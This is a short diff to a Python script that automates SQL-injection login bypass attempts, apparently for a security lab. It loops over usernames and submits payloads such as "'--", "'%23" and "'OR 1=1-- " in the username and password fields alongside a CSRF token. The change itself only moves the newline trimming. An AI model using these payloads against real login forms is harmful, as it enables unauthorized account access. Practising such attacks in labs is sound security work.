@@ -24,9 +24,8 @@ def get_csrf_token(url, s):
 def try_login_username_sqli(url, s, csrf_token):
     names = File("names.txt")
     for name in names.file:
-        name = name[:-1]
         for comment in ["'--", "'%23"]:
-            pld = name + comment
+            pld = name[:-1] + comment
             data = {
                 "csrf": csrf_token,
                 "username": pld,
@@ -47,10 +46,9 @@ def try_login_username_sqli(url, s, csrf_token):
 def try_login_password_sqli(url, s, csrf_token):
     names = File("names.txt")
     for name in names.file:
-        name = name[:-1]
         data = {
             "csrf": csrf_token,
-            "username": name,
+            "username": name[:-1],
             "password": "'OR 1=1-- "
         }
         log.logger.info(
